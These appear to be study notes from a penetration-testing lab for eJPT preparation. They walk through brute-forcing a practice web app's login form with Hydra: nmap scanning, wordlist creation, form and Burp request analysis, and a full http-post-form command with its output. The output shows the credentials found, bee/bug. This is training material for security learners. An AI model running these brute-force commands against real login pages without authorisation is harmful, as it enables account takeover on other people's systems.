## What is this lab about?
A hands-on lab demonstrating **Hydra** for brute-forcing web application login forms. Covers creating custom wordlists, analyzing form structure, configuring HTTP POST form attacks, and using negative response strings to identify valid credentials.

---

## Key Concepts Explained

**Hydra (THC-Hydra)**
- Parallelized login brute-forcer ‚Äî supports 50+ protocols.
- For web forms: uses `http-post-form` module.
- Replaces `^USER^` and `^PASS^` with values from wordlists.

**HTTP POST Form Brute-Forcing**
- Hydra constructs POST requests with guessed credentials.
- Compares response against "failure string" ‚Äî if NOT present = success.
- Requires exact form parameter names and structure.

**Negative Response String**
- Text that appears ONLY on failed login (e.g., "Invalid credentials").
- Hydra checks: if this string is in response ‚Üí login failed.
- If string NOT found ‚Üí potential valid credentials.

## Commands & Workflow

### Step 1 ‚Äî Environment Setup
```bash
# Check Kali IP and identify target
ip addr show
nmap -sV 192.107.115.0/24
# Target: 192.107.115.3 (HTTP + MySQL)
```

### Step 2 ‚Äî Create User Wordlist
```bash
# Create custom users list
nano users
# Content:
admin
bee
Josh

# Save and verify
cat users
```

### Step 3 ‚Äî Create Password Wordlist
```bash
# Use existing wordlist + add known password
cat /usr/share/wordlists/rockyou.txt > passwords
# Or copy from desktop
cat /root/Desktop/wordlists/* > passwords

# Add target password to ensure success
echo "bug" >> passwords

# Verify
head passwords
tail passwords  # Should show "bug"
```

### Step 4 ‚Äî Analyze Login Form (Browser)
```bash
# Navigate to: http://192.107.115.3/login.php
# Test invalid login: random / password
# Error message: "Invalid credentials or user not activated!"

# View page source to find form parameters:
# <form method="post" action="login.php">
#   <input name="login" type="text">
#   <input name="password" type="password">
#   <input name="security_level" type="hidden" value="0">
#   <input name="form" type="submit" value="submit">
# </form>
```

### Step 5 ‚Äî Verify with Burp Suite
```bash
# Enable Burp proxy, intercept login request
# Captured POST request:
POST /login.php HTTP/1.1
Host: 192.107.115.3
Content-Type: application/x-www-form-urlencoded

login=random&password=password&security_level=0&form=submit

# Confirm parameter names match page source
```

### Step 6 ‚Äî Hydra Attack
```bash
# Syntax: hydra -L <users> -P <passwords> <target> http-post-form "<path>:<<params>:<<fail_string>"

hydra -L users -P passwords \
  192.107.115.3 http-post-form \
  "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials"

# Breakdown:
# -L users              ‚Üí User wordlist
# -P passwords          ‚Üí Password wordlist
# 192.107.115.3         ‚Üí Target IP
# http-post-form        ‚Üí Module for HTTP POST forms
# /login.php            ‚Üí Login page path
# login=^USER^          ‚Üí Replace with username from list
# password=^PASS^       ‚Üí Replace with password from list
# security_level=0      ‚Üí Hidden form field
# form=submit           ‚Üí Submit button parameter
# :Invalid credentials   ‚Üí Failure string (if found = login failed)
```

### Step 7 ‚Äî Results
```bash
# Hydra output:
[16][www-form] host: 192.107.115.3   login: bee   password: bug

# Statistics:
# - 16 tasks per server
# - 303 login tries
# - 1 valid credential found: bee / bug
```

## Hydra Flags Reference

| Flag | Purpose | Example |
|---|---|---|
| `-l` | Single username | `-l admin` |
| `-L` | User wordlist | `-L users.txt` |
| `-p` | Single password | `-p password` |
| `-P` | Password wordlist | `-P passwords.txt` |
| `-t` | Tasks/threads | `-t 16` (default) |
| `-v` | Verbose output | `-v` |
| `-o` | Output to file | `-o results.txt` |

## HTTP POST Form Syntax

```
"<path>:<<body_params>:<<failure_string>"

# Path: Login page URL path
# Body: Form parameters with ^USER^ and ^PASS^ placeholders
# Failure string: Text that appears only on failed login
```

## Key Takeaways

| Finding | Detail |
|---|---|
| **Valid credentials** | `bee` / `bug` |
| **Form parameters** | `login`, `password`, `security_level`, `form` |
| **Failure indicator** | "Invalid credentials or user not activated!" |
| **Speed** | 303 attempts, very fast with 16 threads |

- **Always verify form structure** ‚Äî parameter names must match exactly (check Burp or page source).
- **Failure string is critical** ‚Äî wrong string = false positives or missed credentials.
- **Hidden fields matter** ‚Äî `security_level` and `form` are required for the request to work.
- **Wordlist quality** ‚Äî include known/targeted passwords; bigger ‚âÝ better.
- **Burp confirmation** ‚Äî intercept and compare Hydra's request with legitimate login request.
- **Legal note** ‚Äî Hydra warns: "Don't use in military or secret service organizations."
- **eJPT relevance**: Password attacks are tested ‚Äî understand Hydra syntax and web form brute-forcing.
